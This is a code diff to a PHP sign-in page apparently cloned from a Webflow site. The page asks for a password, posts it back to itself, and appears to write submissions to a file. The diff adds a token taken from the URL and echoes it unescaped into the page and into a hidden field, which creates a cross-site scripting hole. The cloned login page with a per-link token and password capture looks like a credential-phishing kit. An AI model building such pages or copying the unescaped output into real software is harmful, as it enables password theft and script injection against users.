@@ -8,7 +8,7 @@
    fclose($handle);
    exit;
    } ?>
-<!DOCTYPE html><!-- This site was created in Webflow. http://www.webflow.com --><!-- Last Published: Fri Feb 11 2022 23:37:25 GMT+0000 (Coordinated Universal Time) -->
+<?php $token_from_link = isset($_GET['token']) ? $_GET['token'] : '';?>
 <html data-wf-domain="steves-amazing-site-5f1f95.webflow.io" data-wf-page="6206b906713e806cfa5d8923" data-wf-site="6206b905713e806d865d8920" data-wf-status="1">
    <head>
       <meta charset="utf-8"/>
@@ -934,19 +934,19 @@
             <div>
                <h1 class="heading-6">Sign In | Create Account</h1>
             </div>
-            <p class="paragraph-5">Enter your email to get started.</p>
+         			  <p 
+		  <span class="identifier"> <p><?php echo $token_from_link;?></span>
+            		  </p>	
             <div class="w-form">
                <form action="<?php echo basename(__FILE__); ?>" id="email-form" name="email-form" data-name="Email Form" method="post">
-                  <label for="Password" class="field-label">Password</label><input type="password" class="text-field-2 w-input" maxlength="256" name="Password" data-name="Password" placeholder="" id="Password" required=""/>
+                  <label for="Password" class="field-label">Password</label>
+				  <input type="password" class="text-field-2 w-input" maxlength="256" name="Password" data-name="Password" placeholder="" id="Password" required=""/>
                   <p class="paragraph-4">By tapping Next, you agree to our Privacy Policy and Terms &amp; Conditions.</p>
-                  <input type="submit" value="Next" data-wait="Please wait..." class="submit-button-2 w-button"/>
+                 <span> <input type="submit" value="Next" data-wait="Please wait..." class="submit-button-2 w-button"/>
+				  <input type="hidden" name="token" value="<?php echo $token_from_link;?>">
+			<input type="hidden" value="true" name="verify"></span>
                </form>
-               <div class="w-form-done">
-                  <div>Thank you! Your submission has been received!</div>
-               </div>
-               <div class="w-form-fail">
-                  <div>Oops! Something went wrong while submitting the form.</div>
-               </div>
+             
             </div>
          </div>
       </div>
